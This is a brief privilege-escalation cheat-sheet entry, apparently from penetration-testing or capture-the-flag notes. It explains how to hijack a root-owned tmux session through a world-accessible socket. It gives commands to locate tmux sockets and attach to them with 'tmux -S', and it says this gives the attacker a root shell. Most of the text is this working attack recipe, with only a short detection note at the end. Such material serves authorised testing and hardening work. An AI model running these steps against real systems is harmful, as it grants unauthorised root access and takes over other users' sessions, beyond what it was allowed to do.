# tmux Session Hijack via World-Accessible Socket

When a privileged user (root) runs tmux with a custom socket path accessible by the current user, attach to steal their session:

**Find tmux sockets:**
```bash
ps aux | grep tmux
# e.g.: /usr/bin/tmux -S /.devs/dev_sess
ls -la /.devs/dev_sess
```

**Attach to the socket:**
```bash
tmux -S /.devs/dev_sess attach
# or:
tmux -S /path/to/socket a -t <session_name>
```

You inherit the session owner's privileges — if root was running it, you get a root shell.

**Detect** writable/accessible tmux sockets:
```bash
find / -name "*.sock" -o -name "dev_sess" 2>/dev/null
find /tmp /dev /var/run /run -type s 2>/dev/null | xargs ls -la 2>/dev/null | grep -v root.*root
```
